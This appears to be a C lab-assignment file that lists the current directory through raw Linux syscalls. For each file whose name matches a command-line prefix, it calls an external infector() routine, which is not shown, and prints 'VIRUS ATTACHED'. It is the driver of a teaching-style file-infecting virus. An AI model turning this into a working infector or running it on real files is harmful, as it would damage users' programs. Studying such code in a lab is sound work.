#include "util.h"
extern int system_call(int syscall, ...);
extern void infector(char*);

/* System call numbers */
#define EXIT 1
#define WRITE 4
#define OPEN 5
#define CLOSE 6
#define SYS_GETDENTS 141

/* FILES */
#define STDIN 0
#define STDOUT 1
#define STDERR 2

struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Not an offset; see below */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
};

/* declerations */
int open_curr_dir();
int get_dirs(int fd, char* buffer);
void print_dirs(char* buff, int nread, char* prefix);
void close_dir(int fd);
char* get_prefix(int argc , char* argv[]);
void attach_and_print(char* buffer, int nread, char* prefix);
void attach(char* file_name, char* prefix);

int main (int argc , char* argv[]){
    /*task2b: get prefix*/
    char* prefix = get_prefix(argc, argv);

    /* task2a: open dir, get_dents, print directories*/
    int fd = open_curr_dir();
    char buffer[8192];
    int nread = get_dirs(fd, buffer);
    /*attach_and_print(buffer, nread, prefix);*/
    print_dirs(buffer, nread, prefix);
    close_dir(fd);

    return 0;
}

/*  
    @brief Open the current directory "."
*/
int open_curr_dir(){
    char* dir = ".";
    int flag = 0;        /* for read only */
    int permissions = 0; /* no explicit file permission settings are provided */
    
    int fd = system_call(OPEN, dir, flag, permissions);
    if(fd < 0){
        system_call(EXIT, 0x55);
    }
    return fd;
}

/*
    @brief Prints the directories in fd using get_dents syscall.
    @param fd: The directory fd(needs to be open)
    @param buffer: An empty buffer the directories will be read to
*/
int get_dirs(int fd, char* buffer){
    int buf_size = 8192;
    int read = system_call(SYS_GETDENTS, fd, buffer, buf_size);
    if(read == -1) system_call(EXIT, 0x55);
    return read;
}

/*  
    @brief The function will print the name of the directories within buff
    @param buff: a buffer with linux_dirent structures.
    @param nread: The size of the buffer.
*/
void print_dirs(char* buff, int nread, char* prefix){
    struct linux_dirent *d;
    int bpos;
    for (bpos = 0; bpos < nread;) {
        d = (struct linux_dirent *)(buff + bpos);
        system_call(WRITE, STDOUT, d->d_name, strlen(d->d_name));
        attach(d->d_name, prefix);
        system_call(WRITE, STDOUT, "\n", 1);
        bpos += d->d_reclen;
    }
}

/* @brief Close directory with file descriptor 'fd' */
void close_dir(int fd){
    system_call(CLOSE, fd);
}

char* get_prefix(int argc , char* argv[]){
    int i;
    for(i = 0; i < argc; i++){
        if(strncmp("-a", argv[i], 2) == 0)
            return (char*)(argv[i] + 2);
    }

    system_call(WRITE, STDERR, "Invalid prefix\n", 15);
    system_call(EXIT, 0x55);

    return 0;
}


void attach(char* file_name, char* prefix){
    int len = strlen(prefix);
    if(strncmp(prefix, file_name, len) == 0){
        infector(file_name);
        system_call(WRITE, STDOUT, " VIRUS ATTACHED", 15);
    }
}

